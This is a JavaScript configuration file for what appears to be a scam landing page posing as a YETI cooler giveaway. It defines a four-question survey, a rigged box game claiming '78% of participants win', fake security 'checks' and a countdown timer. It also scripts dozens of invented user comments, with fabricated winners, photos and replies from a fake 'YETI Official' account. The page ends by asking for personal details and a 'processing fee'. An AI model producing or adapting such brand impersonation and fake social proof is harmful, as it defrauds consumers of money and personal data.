const today = () => {
	const currentDate = new Date();
	return {
		date: currentDate.getDate(),
		month: currentDate.toLocaleString("en-US", { month: "long" }),
		year: currentDate.getFullYear(),
	};
};
const MODES = {
	dev: "development",
	prod: "production",
};
const TYPES = {
	DTC: "DTC",
	FF: "FF",
};
const WITH_EMPTY_POPUP = true;
const TYPE = TYPES.FF;
const MODE = MODES.dev;
const geo = MODE === MODES.dev ? "Location" : document.body.dataset.geo;
const price = MODE === MODES.dev ? "$price" : document.body.dataset.price;
const url = document.body.dataset.url;
const BASE_URL = TYPE === TYPES.FF ? "/OID-40-FF-StavV2" : "/OID-40-DTC-StavV2";
const PREFIX = MODE === MODES.dev ? "." : BASE_URL;
const EMOJIS = {
	sad: `sad.webp`,
	wow: `wow.webp`,
	heart: `heart.webp`,
	haha: `haha.webp`,
	care: `care.webp`,
	like: `like.webp`,
};
const OFFICIAL_AUTHOR = {
	avatar: `authors/yeti-official.png`,
	fullName: "YETI Official",
	isOfficial: true,
};
const HOME_THUMBS = ["home-page-product.png"];
const CONTACT_THUMBS = ["contact-page-product.png"];
const CLARITY_ID = "";
const WITH_CLARITY = false;
const COMMENTS_TEXTS = [
	"I didn't win 😭 but congrats to everyone who did! Maybe next time.",
	"Don't give up, Mark! There's always hope for the next giveaway.",
	"Try next time!",
	"Just finished the survey and I won! Can't wait to use my new YETI cooler this summer. Thank you! 🙌",
	"I can't believe it, I won! 🎉 Thanks so much, YETI!",
	"Awesome, Lucas! Enjoy your time at the beach with your new YETI Cooler.",
	"Did anyone else have trouble with the link? It keeps taking me to an error page.",
	"Worked fine for me. Maybe try a different browser?",
	"Scam alert! This is too good to be true. No way they’re giving away 1000 coolers.",
	"It’s legit! I just won one. Sometimes good things do happen, Tom.",
	"@Tom Harris Ok boomer 😂 ",
	"Sofia, can you prove it? Post a screenshot or something.",
	"Here! Gonna go kayaking with it next weekend. So excited!!",
	"How long does it take to get the confirmation email? I won but haven't received anything yet.",
	"I got mine within minutes. Maybe check your spam folder?",
	"No luck here either 😞 but congrats to everyone who won!",
	"What are the questions on the survey? Are they hard?",
	"Super easy! Just basic questions about you!",
	"Finally won something! Thanks, YETI! Can't wait to take this on my next hiking trip.",
	"Another scam, I bet. Did anyone actually get a cooler yet?",
	"I just got the confirmation email. Seems real to me!",
	"I’ll believe it when I see someone post a picture with their cooler.",
	"For those who won, how long did the survey take?",
	"Just a few minutes. Super quick!",
	"Got an error on the last question and now I can't finish the survey. So frustrating!",
	"Winning this would be perfect for my camping trips! Fingers crossed 🤞",
	"Good luck, Eric! I hope you win!",
	`Is this open worldwide or just for the ${geo}?`,
	`I think it’s just for the ${geo}, but not 100% sure.`,
	`Hi Hawk, the giveaway is only open to ${geo} residents. Sorry for any inconvenience!`,
	"Another giveaway I didn’t win. My luck is the worst!",
	"Don't worry, Tim! There will be more opportunities. Keep trying!",
	"I actually won! Can't wait to go on my next fishing trip with this, already planning it!",
	"Congratulations, Santiago! Enjoy your prize and have a great fishing trip!",
	"I won the YETI Backpack Cooler giveaway last year. It’s been my trusty companion on all my camping trips. Love this bugger! 🛶 🌞",
	"That's great to hear, Noah!",
];
const COMMENTS = [
	{
		author: {
			avatar: `authors/salie-hull.png`,
			fullName: "Salie Hull",
		},
		text: COMMENTS_TEXTS[0],
		time: "5m ago",
		comments: [
			{
				author: {
					avatar: `authors/linda-brown.png`,
					fullName: "Linda Brown",
				},
				text: COMMENTS_TEXTS[1],
				time: "4m ago",
			},
			{
				author: OFFICIAL_AUTHOR,
				text: COMMENTS_TEXTS[2],
				time: "4m ago",
			},
		],
	},
	{
		author: {
			avatar: `authors/jane-smith.png`,
			fullName: "Jane Smith",
		},
		text: COMMENTS_TEXTS[3],
		time: "5m ago",
		comments: [],
	},
	{
		author: {
			avatar: `authors/lucas-silva.png`,
			fullName: "Lucas Silva",
		},
		text: COMMENTS_TEXTS[4],
		time: "11m ago",
		attachment: `attachments/lucas-silva.png`,
		reactions: {
			count: 5,
			emojis: [EMOJIS.heart, EMOJIS.wow, EMOJIS.like],
		},
		comments: [
			{
				author: OFFICIAL_AUTHOR,
				text: COMMENTS_TEXTS[5],
				time: "4m ago",
				reactions: {
					count: 5,
					emojis: [EMOJIS.heart],
				},
			},
		],
	},
	{
		author: {
			avatar: `authors/sarah-lee.png`,
			fullName: "Sarah Lee",
		},
		text: COMMENTS_TEXTS[6],
		time: "16m ago",
		comments: [
			{
				author: {
					avatar: `authors/kai-zhang.png`,
					fullName: "Kai Zhang",
				},
				text: COMMENTS_TEXTS[7],
				time: "14m ago",
			},
		],
	},
	{
		author: {
			avatar: `authors/tom-harris.png`,
			fullName: "Tom Harris",
		},
		text: COMMENTS_TEXTS[8],
		time: "5m ago",
		comments: [
			{
				author: {
					avatar: `authors/sofia-martinez.png`,
					fullName: "Sofia Martinez",
				},
				text: COMMENTS_TEXTS[9],
				time: "4m ago",
			},
			{
				author: {
					avatar: `authors/liam-o-connor.png`,
					fullName: "Liam O'Connor",
				},
				text: COMMENTS_TEXTS[10],
				time: "5m ago",
			},
			{
				author: {
					avatar: `authors/jason-wright.png`,
					fullName: "Jason Wright",
				},
				text: COMMENTS_TEXTS[11],
				time: "5m ago",
			},
			{
				author: {
					avatar: `authors/sofia-martinez.png`,
					fullName: "Sofia Martinez",
				},
				text: COMMENTS_TEXTS[12],
				time: "5m ago",
				attachment: `attachments/sofia-martinez.png`,
				reactions: {
					count: 5,
					emojis: [EMOJIS.heart],
				},
			},
		],
	},
	{
		author: {
			avatar: `authors/james-thompson.png`,
			fullName: "James Thompson",
		},
		text: COMMENTS_TEXTS[13],
		time: "16m ago",
		comments: [
			{
				author: {
					avatar: `authors/alice-martinez.png`,
					fullName: "Alice Martinez",
				},
				text: COMMENTS_TEXTS[14],
				time: "14m ago",
			},
		],
	},
	{
		author: {
			avatar: `authors/katie-evans.png`,
			fullName: "Katie Evans",
		},
		text: COMMENTS_TEXTS[15],
		time: "16m ago",
	},
	{
		author: {
			avatar: `authors/chris-robinson.png`,
			fullName: "Chris Robinson",
		},
		text: COMMENTS_TEXTS[16],
		time: "16m ago",
		comments: [
			{
				author: {
					avatar: `authors/jenna-adams.png`,
					fullName: "Jenna Adams",
				},
				text: COMMENTS_TEXTS[17],
				time: "14m ago",
			},
		],
	},
	{
		author: {
			avatar: `authors/igor-petrov.png`,
			fullName: "Igor Petrov",
		},
		text: COMMENTS_TEXTS[18],
		time: "5m ago",
		attachment: `attachments/igor-petrov.png`,
		reactions: {
			count: 16,
			emojis: [EMOJIS.heart, EMOJIS.wow],
		},
	},
	{
		author: {
			avatar: `authors/laura-peterson.png`,
			fullName: "Laura Peterson",
		},
		text: COMMENTS_TEXTS[19],
		time: "16m ago",
		comments: [
			{
				author: {
					avatar: `authors/paul-green.png`,
					fullName: "Paul Green",
				},
				text: COMMENTS_TEXTS[20],
				time: "14m ago",
			},
			{
				author: {
					avatar: `authors/laura-peterson.png`,
					fullName: "Laura Peterson",
				},
				text: COMMENTS_TEXTS[21],
				time: "14m ago",
			},
		],
	},
	{
		author: {
			avatar: `authors/nick-foster.png`,
			fullName: "Nick Foster",
		},
		text: COMMENTS_TEXTS[22],
		time: "16m ago",
		comments: [
			{
				author: {
					avatar: `authors/julia-simmons.png`,
					fullName: "Julia Simmons",
				},
				text: COMMENTS_TEXTS[23],
				time: "5m ago",
				reactions: {
					count: 1,
					emojis: [EMOJIS.like],
				},
			},
		],
	},
	{
		author: {
			avatar: `authors/megan-butler.png`,
			fullName: "Megan Butler",
		},
		text: COMMENTS_TEXTS[24],
		time: "16m ago",
	},
	{
		author: {
			avatar: `authors/eric-sanders.png`,
			fullName: "Eric Sanders",
		},
		text: COMMENTS_TEXTS[25],
		time: "5m ago",
		reactions: {
			count: 6,
			emojis: [EMOJIS.like],
		},
		comments: [
			{
				author: {
					avatar: `authors/kelly-brooks.png`,
					fullName: "Kelly Brooks",
				},
				text: COMMENTS_TEXTS[26],
				time: "14m ago",
			},
		],
	},
	{
		author: {
			avatar: `authors/hawk-tuah.png`,
			fullName: "Hawk Tuah",
		},
		text: COMMENTS_TEXTS[27],
		time: "16m ago",
		comments: [
			{
				author: {
					avatar: `authors/steve-young.png`,
					fullName: "Steve Young",
				},
				text: COMMENTS_TEXTS[28],
				time: "14m ago",
			},
			{
				author: OFFICIAL_AUTHOR,
				text: COMMENTS_TEXTS[29],
				time: "5m ago",
				reactions: {
					count: 5,
					emojis: [EMOJIS.like, EMOJIS.heart],
				},
			},
		],
	},
	{
		author: {
			avatar: `authors/timothy-rossi.png`,
			fullName: "Timothy Rossi",
		},
		text: COMMENTS_TEXTS[30],
		time: "16m ago",
		comments: [
			{
				author: {
					avatar: `authors/amy-white.png`,
					fullName: "Amy White",
				},
				text: COMMENTS_TEXTS[31],
				time: "5m ago",
				reactions: {
					count: 1,
					emojis: [EMOJIS.heart],
				},
			},
		],
	},
	{
		author: {
			avatar: `authors/santiago-gonzalez.png`,
			fullName: "Santiago Gonzalez",
		},
		text: COMMENTS_TEXTS[32],
		time: "5m ago",
		attachment: `attachments/santiago-gonzalez.png`,
		reactions: {
			count: 47,
			emojis: [EMOJIS.heart, EMOJIS.wow],
		},
		comments: [
			{
				author: OFFICIAL_AUTHOR,
				text: COMMENTS_TEXTS[33],
				time: "5m ago",
				reactions: {
					count: 5,
					emojis: [EMOJIS.heart],
				},
			},
		],
	},
	{
		author: {
			avatar: `authors/noah-johnston.png`,
			fullName: "Noah Johnston",
		},
		text: COMMENTS_TEXTS[34],
		time: "5m ago",
		attachment: `attachments/noah-johnston.png`,
		reactions: {
			count: 19,
			emojis: [EMOJIS.heart, EMOJIS.like],
		},
		comments: [
			{
				author: OFFICIAL_AUTHOR,
				text: COMMENTS_TEXTS[35],
				time: "5m ago",
				reactions: {
					count: 1,
					emojis: [EMOJIS.like],
				},
			},
		],
	},
];
const QUESTIONS = [
	{
		question: "Are you a man or a woman?",
		answers: ["Man", "Woman"],
	},
	{
		question: "How old are you?",
		answers: ["18-29", "30-39", "40-49", "50+"],
	},
	{
		question: "How many members are there in your family?",
		answers: ["alone", "1", "2", "3+"],
	},
	{
		question: "Have you bought anything at YETI before?",
		answers: ["yes", "no"],
	},
];
const HOW_IT_WORKS_STEPS = [
	{
		title: "Quick Survey",
		text: "Answer 4 simple questions in our 5-minute survey.",
	},
	{
		title: "Try Your Luck",
		text: "Guess the winning box in 3 tries. Remember, 78% of participants win!",
	},
	{
		title: "Claim Your Prize",
		text: "If you win, provide your details and pay only for shipping to get your YETI cooler.",
	},
];
const CHECKS = [
	"You answered 4 out of 4 questions",
	"There are no previous polls from your IP address.",
	"There are still prizes available!",
];
const ASSOCIATIONS = {
	firstName: "first_name",
	lastName: "last_name",
	address: "address",
	city: "city",
	postalCode: "zip",
	phone: "phone",
	email: "email",
};
const currentDate = today();
const todayText = `${currentDate.month} ${currentDate.date}, ${currentDate.year}`;
const HOME_PAGE = {
	title: "Congratulations, You can win YETI M20 Back Pack Cooler!",
	text1: `Today, ${todayText}, you have been chosen to participate in this survey. <span>It will only take a minute of your</span> time and you can <span>receive a fantastic prize</span>: YETI M20 Back Pack Cooler!`,
	text2: `We're thrilled to announce that we're hosting a giveaway for the YETI M20 Back Pack Cooler with slightly damaged packaging.`,
	text3: "<span>These coolers are still in top-notch condition,</span> with just a little wear on the packaging. It's a small trade-off for the chance to own YETI's top selling product!",
	thumbs: HOME_THUMBS,
};
const SUCCESS_MODAL = {
	title: "You're a Winner!",
	subtitle: "You've won a YETI M20 Backpack Cooler!",
	rules: [
		'1) Click the "Claim Now" button below to visit our certified distributor\'s secure website.',
		`2) Enter your shipping address and pay the nominal processing fee of just ${price}.`,
		"3) The YETI M20 Back Pack Cooler will be delivered within 5-7 days",
	],
};
const COMMENTS_SECTION = {
	title: "Hear What people say About YETI giveaway",
};
const START_MODAL = {
	title: "You can now participate in a game to win YETI",
	text: "You have the chance to win one of our prizes. Simply choose one of the boxes and try your luck!",
};
const CONTACT_PAGE = {
	title: "Your YETI M20 Backpack Cooler is waiting for you!",
	text: "The last step is to fill contact information so we can delivery YETI to you",
	thumbs: CONTACT_THUMBS,
};
const LOADER_TIMEOUT = 1000;
const CONFIRMED_TIMEOUT = 500;
const TIMER_INIT_VALUE = 240;
window.CONFIG = {
	questions: QUESTIONS,
	prefix: PREFIX,
	comments: COMMENTS,
	howItWorksSteps: HOW_IT_WORKS_STEPS,
	checks: CHECKS,
	associations: ASSOCIATIONS,
	type: TYPE,
	timerInitValue: TIMER_INIT_VALUE,
	loaderTimeout: LOADER_TIMEOUT,
	confirmedTimeout: LOADER_TIMEOUT + CONFIRMED_TIMEOUT,
	clarity: {
		id: CLARITY_ID,
		enabled: WITH_CLARITY,
	},
	withEmptyPopup: WITH_EMPTY_POPUP,
	url: url,
	successModal: SUCCESS_MODAL,
	homePage: HOME_PAGE,
	commentsSection: COMMENTS_SECTION,
	startModal: START_MODAL,
	contactPage: CONTACT_PAGE,
};
